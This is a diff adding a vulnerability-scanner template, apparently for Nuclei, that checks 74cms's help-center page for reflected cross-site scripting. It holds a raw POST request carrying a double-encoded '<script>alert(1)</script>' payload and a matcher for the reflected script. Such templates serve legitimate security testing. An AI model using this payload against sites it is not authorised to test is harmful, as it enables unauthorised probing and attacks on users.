@@ -1,0 +1,37 @@
+id: 74cms-help-reflective-xss
+
+info:
+  name: 骑士cms帮助中心反射型xss
+  author: Master先生
+  severity: medium
+  reference:
+    - https://www.freebuf.com/vuls/284537.html
+  tags: 74cms,xss
+
+requests:
+  - raw:
+      - |
+        POST /index.php?m=&c=help&a=help_list HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 132
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Referer: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: PHPSESSID=3a4cb8a5ff50c4d8e95b7b2b7fa52905; think_language=zh-CN; think_template=default
+        Connection: close
+
+        key=%253cscript%253ealert%25281%2529%253c%252fscript%253e&__hash__=3d816226814ccf6613b2d889acfba46e_d5b018c01c169358a2fb3cd2f112e52d
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200"
+          - "contains((body), '<script>alert(1)</script>')"
+        condition: and
